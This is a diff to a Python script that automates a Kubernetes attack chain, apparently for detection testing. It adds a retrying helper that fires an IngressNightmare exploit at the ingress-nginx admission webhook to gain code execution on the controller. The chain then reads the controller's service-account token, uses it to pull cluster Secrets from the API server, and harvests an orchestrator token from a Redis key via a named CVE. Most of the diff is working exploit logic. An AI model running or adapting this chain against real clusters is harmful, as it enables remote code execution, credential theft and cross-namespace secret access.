@@ -34,6 +34,7 @@ ING_NS = "ingress-nginx"
 CTRL_SELECTOR = "app.kubernetes.io/component=controller"
 ADM_SVC = "ingress-nginx-controller-admission"     # the admission webhook (:443)
 ING_BIN = "/tmp/ing"                               # the IngressNightmare PoC, staged into the worker
+ING_RANGE = "-S 3 -E 90"
 C2_NODE = "c2/ran"
 SWEEP_HOSTS = 62
 CTRL_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
@@ -120,6 +121,12 @@ def redis_sa_id():
                      and "oopservability" in n["id"] and "redis" in n["id"])
 
 
+def redis_clusterip():
+    rc, out = sh("kubectl -n oopservability get svc oopservability-redis "
+                 "-o jsonpath='{.spec.clusterIP}'")
+    return out.strip() if rc == 0 and out.strip() else None
+
+
 def adm_clusterip():
     _, out = sh(f"kubectl -n {ING_NS} get svc {ADM_SVC} -o jsonpath='{{.spec.clusterIP}}'")
     return out.strip()
@@ -129,6 +136,46 @@ def ctrl_podip():
     _, out = sh(f"kubectl -n {ING_NS} get pod -l {CTRL_SELECTOR} "
                 "-o jsonpath='{.items[0].status.podIP}'")
     return out.strip()
+
+
+def fresh_controller(ctx):
+    sh(f"kubectl -n {ING_NS} rollout restart deploy/ingress-nginx-controller", timeout=30)
+    sh(f"kubectl -n {ING_NS} rollout status deploy/ingress-nginx-controller --timeout=150s", timeout=170)
+    sh(f"kubectl -n {ING_NS} wait --for=jsonpath='{{.subsets[0].addresses[0].ip}}' "
+       "endpoints/ingress-nginx-controller-admission --timeout=60s", timeout=70)
+    time.sleep(15)
+    ctx["adm_ip"] = adm_clusterip()
+    ctx["ctrl_ip"] = ctrl_podip()
+    return ctx["ctrl_ip"]
+
+
+def controller_marker_present(mark):
+    ctrl = sh(f"kubectl -n {ING_NS} get po -l {CTRL_SELECTOR} "
+              "-o jsonpath='{.items[0].metadata.name}'")[1].strip()
+    if not ctrl:
+        return False
+    rc, _ = sh(f"kubectl -n {ING_NS} exec {ctrl} -c controller -- test -f {mark}")
+    return rc == 0
+
+
+def rce(ctx, payload, note, tries=4):
+    for i in range(tries):
+        if i == 0:
+            ctx["adm_ip"], ctx["ctrl_ip"] = adm_clusterip(), ctrl_podip()
+        else:
+            fresh_controller(ctx)
+        adm, podip = ctx.get("adm_ip"), ctx.get("ctrl_ip")
+        if not (adm and podip):
+            print("      !! ingress targets unresolved")
+            return False
+        mark = f"/tmp/rce-{int(time.time()*1000)}"
+        worker_sh(f"{ING_BIN} -m c -c '{payload}; touch {mark}' {ING_RANGE} "
+                  f"-i https://{adm}:443 -u http://{podip}:80 --is-auth-url", note)
+        if controller_marker_present(mark):
+            print(f"      -> RCE landed on the controller (marker {mark})")
+            return True
+        print("      -> exploit race missed; retrying on a fresh controller")
+    return False
 
 
 def executing_pod_ip():
@@ -429,25 +476,14 @@ def step_13_ingress_nightmare(ctx):
     the documented IngressNightmare signature (R0002); the injected nginx-cfg
     temp files and the out-of-baseline traffic (R0012) corroborate. Proves
     execution with `id`, like chains 1/2."""
-    adm = ctx.get("adm_ip") or adm_clusterip()
-    podip = ctx.get("ctrl_ip") or ctrl_podip()
-    if not (adm and podip):
-        print("      !! ingress targets unresolved")
-        return False
-    return worker_sh(
-        f"{ING_BIN} -m c -c 'id' -i https://{adm}:443 -u http://{podip}:80 --is-auth-url",
-        "unit-5: IngressNightmare RCE via auth-url injection")
+    return rce(ctx, "id", "unit-5: IngressNightmare RCE via auth-url injection")
 
 
 def step_14_read_ctrl_token(ctx):
     """unit-5/5: read the controller's SA token through the RCE. Chain 1/2 read
     the specimen's token through their RCE; chain 3 reads the ingress-nginx
     controller token, which is cluster-scoped (Secret read across namespaces)."""
-    adm = ctx.get("adm_ip") or adm_clusterip()
-    podip = ctx.get("ctrl_ip") or ctrl_podip()
-    return worker_sh(
-        f"{ING_BIN} -m c -c 'cat {CTRL_TOKEN_PATH}' -i https://{adm}:443 -u http://{podip}:80 --is-auth-url",
-        "unit-5: read the controller SA token through the RCE")
+    return rce(ctx, f"cat {CTRL_TOKEN_PATH}", "unit-5: read the controller SA token through the RCE")
 
 
 def step_15_check_ctrl_token(ctx):
@@ -472,16 +508,10 @@ def step_16_read_cluster_secret(ctx):
     request carrying the bearer token (http_events / key-material-on-wire), and
     the privilege abuse is a cross-namespace Secret read the worker SA cannot do
     but the controller SA can."""
-    adm = ctx.get("adm_ip") or adm_clusterip()
-    podip = ctx.get("ctrl_ip") or ctrl_podip()
-    # Read a Secret list from the apiserver using the controller token, from
-    # inside the controller pod (where the token and CA are mounted).
     cmd = ("T=$(cat " + CTRL_TOKEN_PATH + "); "
            "curl -sk -H \"Authorization: Bearer $T\" "
            "https://kubernetes.default.svc/api/v1/secrets?limit=5")
-    return worker_sh(
-        f"{ING_BIN} -m c -c '{cmd}' -i https://{adm}:443 -u http://{podip}:80 --is-auth-url",
-        "unit-5: read cluster Secrets with the controller token (privilege abuse)")
+    return rce(ctx, cmd, "unit-5: read cluster Secrets with the controller token (privilege abuse)")
 
 
 def step_17_exfil_token(ctx):
@@ -570,7 +600,11 @@ def step_graft_extract(ctx):
     """unit-5b: extract & INGEST the agent-orchestrator token via CVE-2026-47701.
     rawServiceaccountToken registers it as an auth identity, so orchestrator_identity()
     (unchanged) now resolves an INGESTED, auth-capable node for 18-20."""
-    return execute("extract-serviceaccount-token-via-cve-2026-47701", redis_pod_id(),
+    args = {"PORT": "6379", "REDIS_KEY": "oopservability:receiver:last-authorization"}
+    ip = redis_clusterip()
+    if ip:
+        args["TARGET"] = ip
+    return execute("extract-serviceaccount-token-via-cve-2026-47701", redis_pod_id(), args,
                    note="unit-5b: harvest agent-orchestrator token from redis key",
                    exec_sys=foothold_system())
 
